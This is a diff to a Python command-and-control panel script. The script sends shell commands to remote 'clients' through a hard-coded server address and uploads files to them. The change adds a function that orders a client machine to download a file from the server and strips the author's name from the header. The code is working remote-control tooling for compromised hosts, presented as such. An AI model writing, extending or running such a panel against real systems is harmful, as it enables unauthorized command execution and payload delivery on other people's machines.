@@ -1,6 +1,5 @@
-# c2_control_panel.py - Ethan Zeevi
-import requests
-import os
+# c2_control_panel.py
+import requests, os
 
 SERVER_URL = "http://100.64.4.148:5000"
 current_client = None
@@ -47,6 +46,18 @@ def set_command(client_id, command):
     except Exception as e:
         print(f"Error sending command: {e}")
 
+def download_file_to_client(file_name):
+    """
+    Sends a download command to the client so it can download the file from the server.
+    """
+    try:
+        # Send a download command to the client to download the file from the server
+        command = f"download {file_name}"
+        set_command(current_client, command)
+        print(f"Download command for '{file_name}' sent to client {current_client}.")
+    except Exception as e:
+        print(f"Error sending download command: {e}")
+
 def upload_file(client_id, file_path):
     file_name = os.path.basename(file_path)
     try:
@@ -62,24 +73,12 @@ def upload_file(client_id, file_path):
     except Exception as e:
         print(f"Error uploading file: {e}")
 
-def download_file(file_name, save_path):
-    try:
-        response = requests.get(f"{SERVER_URL}/download/{file_name}")
-        if response.status_code == 200:
-            with open(save_path, 'wb') as f:
-                f.write(response.content)
-            print(f"File '{file_name}' downloaded successfully to '{save_path}'.")
-        else:
-            print(f"Error: File not found. Status Code: {response.status_code}")
-    except Exception as e:
-        print(f"Error downloading file: {e}")
-
 def show_menu():
     print("\nAvailable commands:")
     print("1. Send shell command")
     print("2. Switch to another client")
     print("3. Upload a file to the current client")
-    print("4. Download a file from the server")
+    print("4. Command the client to download a file from the server")
     print("5. Exit")
     print()
 
@@ -115,10 +114,9 @@ def main():
             file_path = input("Enter the path to the file to upload: ").strip()
             upload_file(current_client, file_path)
 
-        elif choice == '4':  # Download file
-            file_name = input("Enter the name of the file to download: ").strip()
-            save_path = input("Enter the path where the file should be saved: ").strip()
-            download_file(file_name, save_path)
+        elif choice == '4':  # Command client to download file from server
+            file_name = input("Enter the name of the file to download from the server: ").strip()
+            download_file_to_client(file_name)
 
         elif choice == '5':
             print("Exiting...")
